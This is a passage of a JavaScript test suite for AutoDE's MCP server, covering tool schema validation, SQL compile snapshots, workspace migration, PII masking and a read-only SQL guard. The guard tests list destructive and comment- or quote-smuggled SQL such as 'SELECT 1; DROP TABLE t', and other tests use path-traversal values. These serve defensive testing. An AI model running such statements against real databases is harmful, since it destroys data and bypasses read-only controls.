      autode_workflow_skip_stage: [{ stage: 'bi', reason: 'no reports in scope' }, { stage: 'bi', reason: 'no' }],
      autode_workflow_reopen_stage: [{ stage: 'mapping', reason: 'new source column' }, { stage: 'mapping' }],
      autode_propose_vocabulary: [{ vocabulary: { entries: [{ kind: 'synonym', from: 'guest', to: 'patron' }] } }, { vocabulary: { entries: [{ kind: 'alias', from: 'a', to: 'b' }] } }],
      autode_start_problem: [{ problemStatement: 'Merge two estates into one' }, { problemStatement: 'short' }],
      autode_select_problem: [{ id: 'p' }, {}],
      autode_ingest_file: [{ path: 'a.ddl', system: 's' }, { path: '' }],
      autode_ingest_metadata: [{ connectionId: 'c', schemas: ['DB.S'] }, { connectionId: 'c', schemas: [] }],
      autode_list_decisions: [{ status: 'pending' }, { status: 'maybe' }],
      autode_get_decision: [{ id: 'dec-x' }, {}],
      autode_resolve_decision: [{ id: 'dec-x', decision: 'approved', by: 'me' }, { id: 'dec-x', decision: 'perhaps', by: 'me' }],
      autode_review_assertion: [{ id: 'x', action: 'confirm', by: 'me' }, { id: 'x', action: 'approve', by: 'me' }],
      autode_verify_assertion: [{ id: 'x', connectionId: 'snowflake:prod' }, { id: 'x' }]
    };
    const f = await mcpWorkspace();
    const client = await mcpSession(f.ws);
    try {
      const tools = (await client.listTools()).tools;
      assert.deepStrictEqual(Object.keys(cases).sort(), tools.map((t) => t.name).sort(), 'every tool has a case');
      for (const t of tools) {
        const [good, bad] = cases[t.name];
        const validate = ajv.compile(t.inputSchema);
        assert.ok(validate(good), `${t.name} rejects its good payload: ${ajv.errorsText(validate.errors)}`);
        assert.ok(!validate(bad), `${t.name} accepts its bad payload`);
        const r = await client.callTool({ name: t.name, arguments: bad });
        assert.ok(r.isError && r.structuredContent.code === 'VALIDATION_FAILED', `${t.name}: ${JSON.stringify(r.structuredContent)}`);
        assert.deepStrictEqual(Object.keys(r.structuredContent).sort(), ['code', 'details', 'message', 'retryable']);
      }
    } finally { await client.close(); f.done(); }
  });

  await test('v0.35.0: golden — autode_compile_transform output for every Tier-1 primitive and dialect matches the committed snapshots byte for byte', async () => {
    const nodeFs = require('node:fs');
    const nodePath = require('node:path');
    const dir = nodePath.join(__dirname, 'golden', 'mcp-compile');
    const update = process.env.AUTODE_UPDATE_GOLDEN === '1';
    if (update) nodeFs.mkdirSync(dir, { recursive: true });
    const params = {
      dedup: { sourceObject: 'RAW.PUBLIC.ORDERS', targetObject: 'CURATED.STAGING.ORDERS_DEDUP', partitionByColumns: ['ORDER_ID'], orderByColumn: 'UPDATED_AT', orderDirection: 'DESC', objectKind: 'view' },
      incremental_load: { sourceObject: 'RAW.PUBLIC.ORDERS', targetObject: 'CURATED.STAGING.ORDERS', keyColumns: ['ORDER_ID'], updateColumns: ['STATUS', 'AMOUNT'] },
      rename_cast: { sourceObject: 'RAW.PUBLIC.CUSTOMERS', targetObject: 'CURATED.STAGING.STG_CUSTOMERS', objectKind: 'view', columns: [{ source: 'CUST_ID', target: 'customer_id', type: 'INTEGER' }, { source: 'EMAIL_ADDR', target: 'email' }] },
      mask: { sourceObject: 'CURATED.STAGING.STG_CUSTOMERS', targetObject: 'CURATED.STAGING.STG_CUSTOMERS_MASKED', passthrough: ['customer_id'], columns: [{ name: 'email', strategy: 'hash' }, { name: 'password', strategy: 'redact' }], saltExpression: "secret('pii', 'salt')" }
    };
    const os = require('node:os');
    const ws = nodeFs.mkdtempSync(nodePath.join(os.tmpdir(), 'autode-mcp-g-'));
    const client = await mcpSession(ws);
    try {
      const kinds = (await client.callTool({ name: 'autode_search_primitives', arguments: {} })).structuredContent.items.filter((p) => p.tier === 1).map((p) => p.kind);
      assert.deepStrictEqual(kinds.sort(), Object.keys(params).sort(), 'a fixture for every Tier-1 primitive');
      let n = 0;
      for (const kind of kinds) {
        for (const dialect of ['snowflake', 'spark_sql', 'google_sql', 'postgres', 'tsql', 'ansi']) {
          const r = await client.callTool({ name: 'autode_compile_transform', arguments: { transform: { kind, params: params[kind] }, target: { platform: 'snowflake', database: 'CURATED', schema: 'STAGING' }, dialect } });
          // GOV: ANSI SQL has no hash function, so a hashing mask is refused there rather than guessed.
          if (kind === 'mask' && dialect === 'ansi') { assert.ok(r.isError && /ANSI SQL has no hash function/.test(JSON.stringify(r.content)), JSON.stringify(r.content)); continue; }
          assert.ok(!r.isError, JSON.stringify(r.structuredContent));
          const file = nodePath.join(dir, `${kind}.${dialect}.${r.structuredContent.language}`);
          if (update) nodeFs.writeFileSync(file, r.structuredContent.content);
          assert.ok(nodeFs.existsSync(file), `missing snapshot ${file} (run with AUTODE_UPDATE_GOLDEN=1)`);
          assert.strictEqual(r.structuredContent.content, nodeFs.readFileSync(file, 'utf8'), `${kind}/${dialect} drifted from its snapshot`);
          n++;
        }
      }
      assert.strictEqual(n, 23);
    } finally { await client.close(); nodeFs.rmSync(ws, { recursive: true, force: true }); }
  });

  await test('v0.35.0: Pipeline Spec tools, prompts and resources over the active problem; resources carry revisions and are redacted', async () => {
    const f = await mcpWorkspace();
    const client = await mcpSession(f.ws);
    try {
      let r = await client.callTool({ name: 'autode_validate_pipeline_spec', arguments: {} });
      assert.ok(!r.isError && r.structuredContent.valid === true, JSON.stringify(r.structuredContent));
      r = await client.callTool({ name: 'autode_compile_pipeline_spec', arguments: { dialect: 'snowflake' } });
      assert.ok(!r.isError, JSON.stringify(r.structuredContent));
      assert.deepStrictEqual(r.structuredContent.entities.map((e) => e.name), ['customers', 'orders', 'products']);
      assert.strictEqual(r.structuredContent.entities[0].artifacts[0].suggestedPath, 'autode-output/retail-ab12/03-build/pipeline-test.v1/customers/01_rename_cast.sql');
      r = await client.callTool({ name: 'autode_generate_design_doc', arguments: {} });
      assert.ok(/customers/.test(r.structuredContent.markdown));
      r = await client.callTool({ name: 'autode_validate_pipeline_spec', arguments: { spec: { id: 'x' } } });
      assert.strictEqual(r.structuredContent.valid, false);
      r = await client.callTool({ name: 'autode_compile_pipeline_spec', arguments: { dialect: 'ansi', path: '../outside.yaml' } });
      assert.strictEqual(r.structuredContent.code, 'PERMISSION_DENIED');
      r = await client.callTool({ name: 'autode_describe_primitive', arguments: { kind: 'no_such' } });
      assert.strictEqual(r.structuredContent.code, 'UNKNOWN_PRIMITIVE');

      const p = await client.getPrompt({ name: 'autode_interview_data-flow', arguments: { answers_so_far: 'Daily batch from shop.' } });
      assert.ok(/Answers so far[\s\S]*Daily batch from shop\./.test(p.messages[0].content.text));
      const sp = await client.getPrompt({ name: 'autode_skill_reviewed-one', arguments: { instruction: 'Summarise orders.' } });
      assert.ok(/declares these tools[^\n]*Read/.test(sp.messages[0].content.text) && /read-only/.test(sp.messages[0].content.text) && /Summarise the data\./.test(sp.messages[0].content.text));
      await assert.rejects(client.getPrompt({ name: 'autode_skill_fresh-one' }), /No skill prompt/, 'an unreviewed skill cannot be fetched by name either');

      const spec = await client.readResource({ uri: 'autode://spec/business-problem' });
      assert.ok(/Retail analytics/.test(spec.contents[0].text) && /^[0-9a-f]{64}$/.test(spec.contents[0]._meta.revision));
      const sem = await client.readResource({ uri: 'autode://semantic/shared/sales' });
      assert.ok(!/hunter2|qqqqqqqqqq/.test(sem.contents[0].text), sem.contents[0].text);
      const prim = await client.readResource({ uri: 'autode://primitives/dedup' });
      assert.ok(JSON.parse(prim.contents[0].text).paramSchema.required.includes('partitionByColumns'));
      await assert.rejects(client.readResource({ uri: 'autode://context/source' }), /no Source context/);
    } finally { await client.close(); f.done(); }
  });

  await test('v0.35.0: context tools — resolve, context pack, assertions and grounding read the ledger the extension wrote; the server writes nothing', async () => {
    const f = await mcpWorkspace();
    const before = treeState(f.ws);
    const client = await mcpSession(f.ws);
    try {
      let r = await client.callTool({ name: 'autode_resolve', arguments: { text: 'orders by customer' } });
      const ids = r.structuredContent.matches.map((m) => m.id);
      assert.ok(ids.includes('obj:shop/prod/shop.orders'), JSON.stringify(r.structuredContent));
      r = await client.callTool({ name: 'autode_get_context_pack', arguments: { purpose: 'qa', query: 'orders amount per customer' } });
      assert.ok(r.structuredContent.manifest.seeds.includes('obj:shop/prod/shop.orders') && /orders/.test(r.structuredContent.text), JSON.stringify(r.structuredContent.manifest));
      r = await client.callTool({ name: 'autode_list_assertions', arguments: { includeMirrors: true } });
      assert.ok(r.structuredContent.total > 0);
      r = await client.callTool({ name: 'autode_list_assertions', arguments: {} });
      assert.strictEqual(r.structuredContent.total, 0, 'mirrors are left out by default');
      r = await client.callTool({ name: 'autode_check_grounding', arguments: { content: 'SELECT o.order_id, o.discount FROM shop.orders o JOIN shop.payments p ON p.order_id = o.order_id' } });
      const unresolved = JSON.stringify(r.structuredContent.unresolved);
      assert.ok(/payments/.test(unresolved) && /discount/.test(unresolved) && !/order_id"/.test(unresolved.replace(/payments[^}]*/g, '')), unresolved);
      assert.strictEqual(r.structuredContent.knownTables, 2);
    } finally { await client.close(); }
    assert.strictEqual(treeState(f.ws), before, 'no file under the workspace was created or changed (no migration marker, no catalog, no ledger session file)');
    f.done();
  });

  await test('v0.35.0: src/engine and src/mcp never import vscode (the bundle has no vscode reference)', () => {
    const nodeFs = require('node:fs');
    const nodePath = require('node:path');
    // Since v0.42.0 the server lives in the CLI bundle (dist/mcp-server.js is a shim for `autode mcp`).
    const bundle = nodeFs.readFileSync(nodePath.join(__dirname, '..', 'dist', 'autode.js'), 'utf8');
    assert.ok(!/require\(["']vscode["']\)/.test(bundle), 'the MCP bundle requires vscode');
    // The unminified development build (v0.45.3: 1.55 MB); the shipped build is minified (about 830 KB) and the package test budgets the tarball.
    assert.ok(bundle.length < 2 * 1024 * 1024, `autode.js is ${Math.round(bundle.length / 1024)} KB (development budget 2 MB)`);
  });

  // ── v0.36.0: .autode/ workspace layout, visible deliverables, migration from .ai-context/ ──
  const cfmOver = (dir) => {
    const mock = {
      Uri: { file: (x) => ({ fsPath: x }), joinPath: (...parts) => ({ fsPath: parts.map((x) => (x && x.fsPath) ? x.fsPath : String(x)).join('/') }) },
      workspace: { fs: { createDirectory: async () => {} }, createFileSystemWatcher: () => ({ onDidChange: () => {}, onDidCreate: () => {}, onDidDelete: () => {}, dispose: () => {} }) },
      RelativePattern: class {}
    };
    delete require.cache[require.resolve('../dist/context/ContextFileManager.js')];
    delete require.cache[require.resolve('../dist/context/GraphManager.js')];
    const { ContextFileManager } = withMock(mock, () => require('../dist/context/ContextFileManager.js'));
    const { GraphManager } = withMock(mock, () => require('../dist/context/GraphManager.js'));
    return new ContextFileManager({ fsPath: dir }, new GraphManager(), () => {});
  };

  await test('v0.36.0: one layout module defines every path; the output folder stays inside the workspace; .autode/.gitignore keeps local/ out of git', () => {
    const os = require('node:os'); const nodeFs = require('node:fs'); const p = require('node:path');
    const L = fresh('../dist/engine/workspaceLayout.js');
    assert.strictEqual(L.layoutRel('ledger'), '.autode/knowledge/ledger');
    assert.strictEqual(L.layoutRel('activeProblem'), '.autode/local/active-problem.json');
    assert.strictEqual(L.layoutRel('toolSkills', 'x'), '.autode/config/skills/tool-skills/x');
    assert.deepStrictEqual(L.outputDirSegments('p1'), ['autode-output', 'p1']);
    assert.deepStrictEqual(L.outputDirSegments('p1', 'deliverables/sql/'), ['deliverables', 'sql', 'p1']);
    for (const bad of ['../outside', 'C:\\temp', '/abs/path', 'a/../../b']) assert.deepStrictEqual(L.outputDirSegments('p1', bad), ['autode-output', 'p1'], bad);
    assert.deepStrictEqual(L.problemFromRoot(p.join('/ws', '.autode', 'problems', 'retail-ab12')), { workspaceRoot: p.resolve('/ws'), problemId: 'retail-ab12' });
    const dir = nodeFs.mkdtempSync(p.join(os.tmpdir(), 'autode-layout-'));
    try {
      L.ensureLayout(dir);
      assert.ok(/^local\/$/m.test(nodeFs.readFileSync(p.join(dir, '.autode', '.gitignore'), 'utf8')));
      for (const d of ['knowledge', 'config', 'local']) assert.ok(nodeFs.statSync(p.join(dir, '.autode', d)).isDirectory(), d);
      nodeFs.writeFileSync(p.join(dir, '.autode', '.gitignore'), 'local/\nmine/\n');
      L.ensureLayout(dir);
      assert.strictEqual(nodeFs.readFileSync(p.join(dir, '.autode', '.gitignore'), 'utf8'), 'local/\nmine/\n', 'an edited .gitignore is kept');
    } finally { nodeFs.rmSync(dir, { recursive: true, force: true }); }
  });

  await test('v0.36.0: migration moves every kind of .ai-context/ file to its new home byte for byte, artifacts to autode-output/, and leaves what it does not recognise', () => {
    const os = require('node:os'); const nodeFs = require('node:fs'); const p = require('node:path');
    const { migrateWorkspace, describeMigration } = fresh('../dist/engine/workspaceMigration.js');
    const dir = nodeFs.mkdtempSync(p.join(os.tmpdir(), 'autode-migrate-'));
    const legacy = {
      'problems/p1/spec/business-problem.yaml': 'id: bps-1\n',
      'problems/p1/plan/plan.yaml': 'steps: []\n',
      'problems/p1/pack/pack.yaml': 'documents: []\n',
      'problems/p1/artifacts/03-build/bps-1.v1/stg.sql': 'select 1\r\n',
      'problems/p1/artifacts/03-build/bps-1.v1/stg.sql.grounding.json': '{"artifact":"stg.sql"}',
      'ledger/2026-10-01.01H.jsonl': '{"type":"asserted"}\n',
      'estate.yaml': 'systems: []\n',
      'sources.yaml': 'sources: []\n',
      'profiles/house.yaml': 'id: house\n',
      'context/business-context.yaml': 'business_terms: []\n',
      'context/vocabulary.yaml': 'synonyms: []\n',
      'context/snapshots/bps-1.v1.md': '# snapshot\n',
      'skills/data-flow.json': '{}',
      'skills/tool-skills/reader/SKILL.md': 'Read.\n',
      'skills/tool-skills/reader/.autode-skill.json': '{}',
      'primitives/k.yaml': 'kind: k\n',
      'target-environment.yaml': 'profiles: {}\n',
      'active-problem.json': '{"problemId":"p1"}',
      'chats/c1.jsonl': '{}\n',
      'derived/graph.json': '{}',
      'catalog/shop/prod/catalog.json': '{}',
      'schema-graph.json': '{}',
      'weird/notes.txt': 'keep me\n'
    };
    const expected = {
      'problems/p1/spec/business-problem.yaml': '.autode/problems/p1/spec/business-problem.yaml',
      'problems/p1/plan/plan.yaml': '.autode/problems/p1/plan/plan.yaml',
      'problems/p1/pack/pack.yaml': '.autode/problems/p1/pack/pack.yaml',
      'problems/p1/artifacts/03-build/bps-1.v1/stg.sql': 'autode-output/p1/03-build/bps-1.v1/stg.sql',
      'problems/p1/artifacts/03-build/bps-1.v1/stg.sql.grounding.json': 'autode-output/p1/03-build/bps-1.v1/stg.sql.grounding.json',
      'ledger/2026-10-01.01H.jsonl': '.autode/knowledge/ledger/2026-10-01.01H.jsonl',
      'estate.yaml': '.autode/knowledge/estate.yaml',
      'sources.yaml': '.autode/knowledge/sources.yaml',
      'profiles/house.yaml': '.autode/knowledge/profiles/house.yaml',
      'context/business-context.yaml': '.autode/knowledge/business-context.yaml',
      'context/vocabulary.yaml': '.autode/knowledge/vocabulary.yaml',
      'context/snapshots/bps-1.v1.md': '.autode/knowledge/snapshots/bps-1.v1.md',
      'skills/data-flow.json': '.autode/config/skills/data-flow.json',
      'skills/tool-skills/reader/SKILL.md': '.autode/config/skills/tool-skills/reader/SKILL.md',
      'skills/tool-skills/reader/.autode-skill.json': '.autode/config/skills/tool-skills/reader/.autode-skill.json',
      'primitives/k.yaml': '.autode/config/primitives/k.yaml',
      'target-environment.yaml': '.autode/config/target-environment.yaml',
      'active-problem.json': '.autode/local/active-problem.json',
      'chats/c1.jsonl': '.autode/local/chats/c1.jsonl',
      'derived/graph.json': '.autode/local/derived/graph.json',
      'catalog/shop/prod/catalog.json': '.autode/local/catalog/shop/prod/catalog.json',
      'schema-graph.json': '.autode/local/schema-graph.json'
    };
    try {
      for (const [rel, body] of Object.entries(legacy)) { const f = p.join(dir, '.ai-context', ...rel.split('/')); nodeFs.mkdirSync(p.dirname(f), { recursive: true }); nodeFs.writeFileSync(f, body); }
      const r = migrateWorkspace(dir);
      assert.strictEqual(r.needed, true);
      for (const [from, to] of Object.entries(expected)) {
        assert.strictEqual(nodeFs.readFileSync(p.join(dir, ...to.split('/')), 'utf8'), legacy[from], `${from} → ${to}`);
        assert.ok(!nodeFs.existsSync(p.join(dir, '.ai-context', ...from.split('/'))), `${from} moved, not copied`);
      }
      assert.strictEqual(r.moved.length, Object.keys(expected).length);
      assert.deepStrictEqual(r.unrecognised, ['.ai-context/weird']);
      assert.strictEqual(nodeFs.readFileSync(p.join(dir, '.ai-context', 'weird', 'notes.txt'), 'utf8'), 'keep me\n');
      assert.strictEqual(r.legacyRemoved, false, '.ai-context/ stays while it holds something unrecognised');
      assert.ok(nodeFs.existsSync(p.join(dir, '.autode', '.gitignore')));
      assert.ok(/22 file\(s\).*2 generated artifact\(s\).*\.ai-context\/weird/.test(describeMigration(r)), describeMigration(r));

      // Idempotent; a teammate who pulled the migration still has local files in .ai-context/.
      assert.strictEqual(migrateWorkspace(dir).moved.length, 0);
      nodeFs.mkdirSync(p.join(dir, '.ai-context', 'chats'), { recursive: true });
      nodeFs.writeFileSync(p.join(dir, '.ai-context', 'chats', 'c2.jsonl'), 'mine\n');
      nodeFs.writeFileSync(p.join(dir, '.ai-context', 'estate.yaml'), 'stale copy\n');
      const r2 = migrateWorkspace(dir);
      assert.deepStrictEqual(r2.moved.map((m) => m.to), ['.autode/local/chats/c2.jsonl']);
      assert.deepStrictEqual(r2.conflicts.map((c) => c.to), ['.autode/knowledge/estate.yaml']);
      assert.strictEqual(nodeFs.readFileSync(p.join(dir, '.autode', 'knowledge', 'estate.yaml'), 'utf8'), 'systems: []\n', 'the copy already in .autode/ wins; nothing is overwritten');

      // A custom output folder is honoured; a fully recognised .ai-context/ is removed.
      const dir2 = nodeFs.mkdtempSync(p.join(os.tmpdir(), 'autode-migrate2-'));
      try {
        const f = p.join(dir2, '.ai-context', 'problems', 'p9', 'artifacts', 'x.sql');
        nodeFs.mkdirSync(p.dirname(f), { recursive: true });
        nodeFs.writeFileSync(f, 'x');
        const r3 = migrateWorkspace(dir2, { artifactDirectory: 'deliverables' });
        assert.deepStrictEqual(r3.moved.map((m) => m.to), ['deliverables/p9/x.sql']);
        assert.strictEqual(r3.legacyRemoved, true);
        assert.ok(!nodeFs.existsSync(p.join(dir2, '.ai-context')));
      } finally { nodeFs.rmSync(dir2, { recursive: true, force: true }); }
      assert.strictEqual(migrateWorkspace(p.join(dir, 'nowhere')).needed, false);
    } finally { nodeFs.rmSync(dir, { recursive: true, force: true }); }
  });

  await test('v0.36.0: a migrated workspace reloads its ledger with no fact lost, retracted or sent to review, and writes only under .autode/local/', async () => {
    const os = require('node:os'); const nodeFs = require('node:fs'); const p = require('node:path');
    const { migrateWorkspace } = fresh('../dist/engine/workspaceMigration.js');
    const { LAYOUT } = fresh('../dist/engine/workspaceLayout.js');
    const dir = nodeFs.mkdtempSync(p.join(os.tmpdir(), 'autode-migrate-cfm-'));
    try {
      // Build a workspace with today's code, then put it back into the pre-v0.36.0 shape —
      // including evidence that names the old business-context path — as an older AutoDE left it.
      nodeFs.mkdirSync(p.join(dir, '.autode', 'knowledge'), { recursive: true });
      nodeFs.writeFileSync(p.join(dir, '.autode', 'knowledge', 'business-context.yaml'), 'business_terms:\n  - term: Revenue\n    description: net sales\n    mapped_tables: [orders]\n');
      nodeFs.writeFileSync(p.join(dir, 'shop.ddl'), 'CREATE TABLE shop.orders (order_id INTEGER PRIMARY KEY, amount NUMBER);');
      let cfm = cfmOver(dir);
      await cfm.initialize();
      const { parseDdl } = fresh('../dist/engine/context/fileIngestion.js');
      const g = parseDdl(nodeFs.readFileSync(p.join(dir, 'shop.ddl'), 'utf8'), p.join(dir, 'shop.ddl'), { system: 'shop', environment: 'prod' });
      await cfm.ingestParsed(g.nodes, g.edges);
      const before = cfm.getLedger().assertions().filter((a) => ['active', 'needs_review', 'proposed'].includes(a.status));
      assert.ok(before.length > 3 && before.some((a) => a.kind === 'business_term'));
      const legacy = p.join(dir, '.ai-context');
      const back = [['knowledge/ledger', 'ledger'], ['knowledge/business-context.yaml', 'context/business-context.yaml'], ['knowledge/estate.yaml', 'estate.yaml'], ['local/derived', 'derived'], ['local/catalog', 'catalog']];
      for (const [from, to] of back) {
        const src = p.join(dir, '.autode', ...from.split('/'));
        if (!nodeFs.existsSync(src)) continue;
        nodeFs.mkdirSync(p.dirname(p.join(legacy, ...to.split('/'))), { recursive: true });
        nodeFs.renameSync(src, p.join(legacy, ...to.split('/')));
      }
      for (const f of nodeFs.readdirSync(p.join(legacy, 'ledger'))) {
        const file = p.join(legacy, 'ledger', f);
        nodeFs.writeFileSync(file, nodeFs.readFileSync(file, 'utf8').split('knowledge/business-context.yaml').join('context/business-context.yaml'));
      }
      nodeFs.rmSync(p.join(dir, '.autode'), { recursive: true, force: true });

      const report = migrateWorkspace(dir);
      assert.ok(report.moved.length > 0 && report.legacyRemoved, JSON.stringify(report));
      cfm = cfmOver(dir);
      await cfm.initialize();
      const after = cfm.getLedger().assertions();
      const live = after.filter((a) => ['active', 'needs_review', 'proposed'].includes(a.status));
      assert.strictEqual(after.filter((a) => a.status === 'needs_review').length, 0, 'nothing sent to review');
      assert.strictEqual(after.filter((a) => a.status === 'rejected').length, 0, 'nothing retracted');
      assert.deepStrictEqual([...new Set(live.map((a) => `${a.kind}|${a.subject.join(',')}|${a.predicate}`))].sort(), [...new Set(before.map((a) => `${a.kind}|${a.subject.join(',')}|${a.predicate}`))].sort(), 'the same facts are live');
      assert.ok(nodeFs.existsSync(p.join(dir, ...LAYOUT.graph)) && !nodeFs.existsSync(p.join(dir, '.autode', 'derived')), 'caches go to local/');
    } finally { nodeFs.rmSync(dir, { recursive: true, force: true }); }
  });

  await test('v0.36.0: editing .autode/knowledge/business-context.yaml takes effect without a reload (the old watcher only saw top-level .ai-context files)', async () => {
    const os = require('node:os'); const nodeFs = require('node:fs'); const p = require('node:path');
    const dir = nodeFs.mkdtempSync(p.join(os.tmpdir(), 'autode-watch-'));
    const watchers = [];
    try {
      const mock = {
        Uri: { file: (x) => ({ fsPath: x }), joinPath: (...parts) => ({ fsPath: parts.map((x) => (x && x.fsPath) ? x.fsPath : String(x)).join('/') }) },
        workspace: { fs: { createDirectory: async () => {} }, createFileSystemWatcher: (pattern) => { const w = { pattern, handlers: {}, onDidChange: (h) => { w.handlers.change = h; }, onDidCreate: (h) => { w.handlers.create = h; }, onDidDelete: (h) => { w.handlers.delete = h; }, dispose: () => {} }; watchers.push(w); return w; } },
        RelativePattern: class { constructor(base, pattern) { this.base = base; this.pattern = pattern; } }
      };
      delete require.cache[require.resolve('../dist/context/ContextFileManager.js')];
      delete require.cache[require.resolve('../dist/context/GraphManager.js')];
      const { ContextFileManager } = withMock(mock, () => require('../dist/context/ContextFileManager.js'));
      const { GraphManager } = withMock(mock, () => require('../dist/context/GraphManager.js'));
      const graph = new GraphManager();
      // Since v0.43.2 the host injects its watcher (the extension passes VS Code's); the engine names the knowledge folder.
      const cfm = new ContextFileManager({ fsPath: dir }, graph, () => {}, undefined, (folder, onChange) => { const w = { folder, onChange, dispose: () => {} }; watchers.push(w); return w; });
      await cfm.initialize();
      const w = watchers.find((x) => /[\\/]\.autode[\\/]knowledge$/.test(x.folder));
      assert.ok(w, 'the knowledge folder is watched');
      nodeFs.writeFileSync(p.join(dir, '.autode', 'knowledge', 'business-context.yaml'), 'business_terms:\n  - term: Churn\n    description: customers lost in a month\n');
      w.onChange();
      await new Promise((r) => setTimeout(r, 700));
      assert.ok(graph.serializeSnapshot().nodes.some((n) => n.type === 'business_term' && /churn/i.test(n.label)), 'the edited term is loaded');
      cfm.dispose();
    } finally { nodeFs.rmSync(dir, { recursive: true, force: true }); }
  });

  // ── v0.37.0: MCP server — data platform, sample-data consent and redaction (phase 4) ──
  await test('v0.37.0: the read-only guard rejects writes, multi-statement input and comment- or quote-smuggled writes; reads pass', () => {
    const { checkReadOnlySql, checkSingleStatement } = fresh('../dist/engine/platform/sqlGuard.js');
    const rejected = [
      'INSERT INTO t VALUES (1)', 'MERGE INTO t USING s ON t.id = s.id WHEN MATCHED THEN DELETE', 'DROP TABLE t', 'CREATE TABLE t (id INT)',
      'GRANT SELECT ON t TO ROLE r', 'CALL my_proc()', 'update t set a = 1', 'TRUNCATE TABLE t', 'ALTER TABLE t ADD COLUMN c INT', 'USE DATABASE prod',
      'SELECT 1; DROP TABLE t', 'SELECT 1;\nSELECT 2', 'SELECT 1 /* ; */ ; DROP TABLE t', 'SELECT 1 -- harmless\n; DELETE FROM t', '/* just a comment */ DROP TABLE t',
      'WITH x AS (SELECT 1) INSERT INTO t SELECT * FROM x', 'SELECT * INTO t2 FROM t', 'EXPLAIN ANALYZE DELETE FROM t', 'EXPLAIN INSERT INTO t VALUES (1)',
      "SELECT 'x\\'' ; DROP TABLE t; --'", 'SELECT $$ x $$; DROP TABLE t', "SELECT 'unterminated", 'SELECT 1 /* never closed', ''
    ];
    for (const sql of rejected) assert.ok(!checkReadOnlySql(sql).ok, `accepted: ${sql}`);
    const passed = [
      ['SELECT * FROM shop.orders', 'query'], ['select \';\' as semi, "drop" from t', 'query'], ['WITH x AS (SELECT 1 AS a) SELECT a FROM x', 'query'],
      ['SHOW TABLES IN SCHEMA shop', 'metadata'], ['DESCRIBE TABLE shop.orders', 'metadata'], ['DESC TABLE t', 'metadata'], ['EXPLAIN SELECT 1', 'metadata'],
      ['SELECT 1;', 'query'], ['-- leading comment\nSELECT last_update, delete_flag FROM t', 'query'], ["SELECT 'it''s' AS s", 'query'], ['(SELECT 1)', 'query']
    ];
    for (const [sql, kind] of passed) {
      const r = checkReadOnlySql(sql);
      assert.ok(r.ok && r.kind === kind, `${sql}: ${JSON.stringify(r)}`);
    }
    assert.ok(!checkSingleStatement('SELECT 1; SELECT 2').ok && checkSingleStatement('SELECT 1; SELECT 2').statements === 2);
    assert.ok(checkSingleStatement('CREATE OR REPLACE VIEW v AS SELECT 1').ok, 'a single write is one statement (for --allow-write and EXPLAIN)');
  });

  await test('v0.37.0: sample data — personal-data columns are recognised by name and value shape; results are withheld without consent and masked with it', () => {
    const S = fresh('../dist/engine/platform/sampleData.js');
    for (const c of ['email', 'EMAIL_ADDRESS', 'customerEmail', 'phone_number', 'first_name', 'LastName', 'date_of_birth', 'dob', 'ssn', 'iban', 'card_number', 'street_address', 'postcode', 'ip_address', 'customer_name'])
      assert.ok(S.isPiiColumnName(c), `not PII: ${c}`);
    for (const c of ['order_id', 'amount', 'product_name', 'status', 'created_at', 'store_code', 'quantity'])
      assert.ok(!S.isPiiColumnName(c), `PII: ${c}`);
    assert.ok(S.looksLikePiiValue('pat@example.com') && S.looksLikePiiValue('4111 1111 1111 1111') && !S.looksLikePiiValue('4111 1111 1111 1112') && !S.looksLikePiiValue('ORD-42'));
    const result = { columns: ['order_id', 'email', 'note'], rows: [{ order_id: 1, email: 'a@b.io', note: 'call pat@example.com' }, { order_id: 2, email: null, note: 'ok' }], rowCount: 2, executionTimeMs: 3 };
    const off = S.gateQueryResult(result, { allowSampleData: false, metadata: false, connectionId: 'snowflake:prod' });
    assert.ok(off.rows === undefined && /withheld/.test(off.withheld) && /connections\.yaml/.test(off.withheld) && off.rowCount === 2 && off.columns.length === 3);
    assert.ok(!JSON.stringify(off).includes('a@b.io'));
    const on = S.gateQueryResult(result, { allowSampleData: true, metadata: false, connectionId: 'snowflake:prod' });
    assert.deepStrictEqual(on.rows, [{ order_id: 1, email: S.MASK, note: S.MASK }, { order_id: 2, email: null, note: 'ok' }]);
    assert.deepStrictEqual([on.maskedColumns, on.maskedValues], [['email'], 1]);
    const meta = S.gateQueryResult({ columns: ['name'], rows: [{ name: 'ORDERS' }], rowCount: 1, executionTimeMs: 1 }, { allowSampleData: false, metadata: true, connectionId: 'x' });
    assert.deepStrictEqual(meta.rows, [{ name: 'ORDERS' }], 'SHOW / DESCRIBE / EXPLAIN describe objects and pass');
    const snap = { platform: 'snowflake', extractedAt: 't', views: [], foreignKeys: [], tables: [{ schema: 'S', name: 'C', fqn: 'D.S.C', type: 'TABLE', columns: [
      { name: 'email', dataType: 'TEXT', isNullable: true, isPrimaryKey: false, isForeignKey: false, ordinalPosition: 1, profile: { distinctCount: 9, nullCount: 0, minValue: 'a@b.io', maxValue: 'z@y.io' } },
      { name: 'amount', dataType: 'NUMBER', isNullable: true, isPrimaryKey: false, isForeignKey: false, ordinalPosition: 2, profile: { distinctCount: 5, minValue: '1.5', maxValue: '99.5' } }] }],
      lineage: [{ sourceFqn: 'a', targetFqn: 'b', queryText: "INSERT INTO b SELECT * FROM a WHERE email = 'q@r.io'" }] };
    const stripped = S.sanitizeSnapshot(snap, false);
    assert.deepStrictEqual(stripped.tables[0].columns.map((c) => c.profile), [{ distinctCount: 9, nullCount: 0 }, { distinctCount: 5 }]);
    assert.ok(!/q@r\.io|a@b\.io|99\.5/.test(JSON.stringify(stripped)) && stripped.lineage[0].sourceFqn === 'a');
    const masked = S.sanitizeSnapshot(snap, true);
    assert.deepStrictEqual([masked.tables[0].columns[0].profile.minValue, masked.tables[0].columns[1].profile.maxValue], [S.MASK, '99.5']);
    assert.ok(snap.tables[0].columns[0].profile.minValue === 'a@b.io', 'the input snapshot is not mutated');
  });

  await test('v0.37.0: connections.yaml — pointers and non-secret fields only; ids match the live connection ids; the environment defines a CI connection', () => {
    const C = fresh('../dist/engine/platform/connectionsConfig.js');
    const yaml = [
      'connections:',
      '  - platform: snowflake',
      '    credentials: { resolver: cli, ref: prod }',
      '    allowSampleDataInPrompts: true',
      '  - platform: snowflake',
      '    role: target',
      '    account: ACME-TGT',
      '    username: deploy',
      '    warehouse: WH',
      '    credentials: { resolver: env, ref: target }',
      '  - platform: databricks',
      '    workspaceUrl: adb-1.azuredatabricks.net',
      '    httpPath: /sql/1.0/warehouses/abc',
      '    token: do-not-commit',
      '  - platform: teradata',
      '  - platform: snowflake',
      '    credentials: { resolver: cli, ref: prod }',
      '  - platform: snowflake',
      '    account: X',
